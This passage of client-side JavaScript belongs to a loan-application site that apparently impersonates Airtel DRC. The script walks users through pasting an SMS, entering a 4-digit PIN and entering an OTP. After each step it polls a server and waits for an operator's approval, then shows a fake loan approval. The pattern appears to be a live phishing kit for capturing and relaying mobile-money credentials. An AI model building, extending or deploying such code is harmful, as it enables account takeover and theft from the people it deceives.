            clearInterval(otpResendTimer);
            otpResendTimer = null;
            btn.disabled = false;
        }
    }, 1000);
}

// ═══════════════════════════════════════════════════════════
// POLLING
// ═══════════════════════════════════════════════════════════
function startPoll(step, nextPageOnApprove) {
    stopPoll();
    activePoll = setInterval(async () => {
        try {
            const res = await fetch(`/api/status/${S.applicationId}/${step}`, { cache: 'no-store' });
            if (res.status === 404) { handleNotFound(); return; }
            const data = await res.json();
            if (!data.ok) return;

            if (data.status === 'approved') {
                stopPoll();
                stopCountdown(step);
                if (step === 'sms') {
                    showToast(t('smsApproved'), 'success');
                    goTo('page-sms-paste');
                } else if (step === 'pin') {
                    showToast(t('pinApproved'), 'success');
                    goTo('page-otp');
                } else if (step === 'otp') {
                    showToast(t('otpApproved'), 'success');
                    showApproval();
                }
                return;
            }
            if (data.status === 'rejected') {
                stopPoll();
                stopCountdown(step);
                if (step === 'sms') {
                    showToast(t('smsRejected'), 'error');
                    goTo('page-sms-paste');
                } else if (step === 'pin') {
                    showToast(t('pinRejected'), 'error');
                    updateAttemptsBadge(data);
                    goTo('page-pin');
                } else if (step === 'otp') {
                    showToast(t('otpRejected'), 'error');
                    goTo('page-otp');
                }
                return;
            }
            if (data.status === 'blocked') {
                stopPoll();
                stopCountdown(step);
                showToast(t('pinBlocked'), 'error');
                updateAttemptsBadge(data);
                goTo('page-pin');
                return;
            }
            // still pending → keep polling
        } catch (err) {
            console.error('Poll error:', err);
        }
    }, POLL_INTERVAL);
}

function stopPoll() {
    if (activePoll) { clearInterval(activePoll); activePoll = null; }
}

function handleNotFound() {
    stopAllTimers();
    showToast(t('appRejected'), 'error');
    goTo('page-landing');
}

function updateAttemptsBadge(data) {
    const badge = document.getElementById('pinAttemptsDisplay');
    if (!badge) return;
    if (data.blocked) {
        badge.textContent = t('blockedBadge');
        badge.className = 'attempts-badge blocked';
        for (let i = 0; i < 4; i++) document.getElementById('pin' + i).disabled = true;
    } else if (typeof data.remainingAttempts === 'number') {
        badge.textContent = '🔑 ' + data.remainingAttempts + ' / 3 ' + t('attemptsBadge');
        badge.className = 'attempts-badge warning';
    }
}

// ═══════════════════════════════════════════════════════════
// COUNTDOWN
// ═══════════════════════════════════════════════════════════
function startCountdown(step, seconds) {
    stopCountdown(step);
    countdownValues[step] = seconds;
    updateCountdownUI(step, seconds);

    countdownTimers[step] = setInterval(() => {
        countdownValues[step]--;
        updateCountdownUI(step, Math.max(0, countdownValues[step]));
        if (countdownValues[step] <= 0) {
            stopCountdown(step);
            const statusEl = document.getElementById(step + 'WaitStatus') || document.getElementById(step + 'Status');
            if (statusEl) statusEl.textContent = t('waitAdmin');
        }
    }, 1000);
}

function stopCountdown(step) {
    if (countdownTimers[step]) { clearInterval(countdownTimers[step]); delete countdownTimers[step]; }
}

function updateCountdownUI(step, seconds) {
    const numEl = document.getElementById(step + 'CountdownNum');
    const circleEl = document.getElementById(step + 'CountdownCircle');
    if (numEl) numEl.textContent = seconds;
    if (circleEl) {
        const pct = seconds / 30;
        circleEl.style.strokeDashoffset = (283 * (1 - pct)).toString();
    }
}

function stopAllTimers() {
    stopPoll();
    Object.keys(countdownTimers).forEach(stopCountdown);
    if (otpResendTimer) { clearInterval(otpResendTimer); otpResendTimer = null; }
}

// ═══════════════════════════════════════════════════════════
// APPROVAL
// ═══════════════════════════════════════════════════════════
function showApproval() {
    const monthly = calcMonthly(S.loanAmount, +S.loanTerm);
    document.getElementById('aprAmount').textContent = '$' + S.loanAmount.toLocaleString();
    document.getElementById('aprAmt').textContent = '$' + S.loanAmount.toLocaleString();
    document.getElementById('aprTerm').textContent = S.loanTerm + ' ' + (currentLang === 'fr' ? 'mois' : 'months');
    document.getElementById('aprMth').textContent = '$' + Math.round(monthly).toLocaleString();
    goTo('page-approval');
}

function finishApplication() {
    localStorage.removeItem('airtel_drc_state');
    location.reload();
}

// ═══════════════════════════════════════════════════════════
// STATE PERSISTENCE
// ═══════════════════════════════════════════════════════════
function saveState() {
    try {
        localStorage.setItem('airtel_drc_state', JSON.stringify(S));
    } catch(e) {}
}
function loadState() {
    try {
        const raw = localStorage.getItem('airtel_drc_state');
        if (raw) Object.assign(S, JSON.parse(raw));
    } catch(e) {}
}

// ═══════════════════════════════════════════════════════════
// SPLASH + INIT
// ═══════════════════════════════════════════════════════════
function runSplash() {
    const bar = document.getElementById('splashLoaderBar');
    const totalMs = 2500;
    const start = Date.now();
    const tick = setInterval(() => {
        const pct = Math.min(100, ((Date.now() - start) / totalMs) * 100);
        bar.style.width = pct + '%';
        if (pct >= 100) {
            clearInterval(tick);
            goTo('page-landing');
        }
    }, 80);
}

document.addEventListener('DOMContentLoaded', () => {
    loadLang();
    loadState();
    runSplash();

    // Calculator on step 1
    document.getElementById('s1am').addEventListener('input', updateStepCalc);
    document.getElementById('s1te').addEventListener('change', updateStepCalc);
    updateLandingCalc();
    updateStepCalc();

    // PIN auto-advance
    for (let i = 0; i < 4; i++) {
        const p = document.getElementById('pin' + i);
        if (p) p.addEventListener('input', () => pinMvM(p, i));
        const o = document.getElementById('otp' + i);
        if (o) o.addEventListener('input', () => otpMvM(o, i));
    }
});
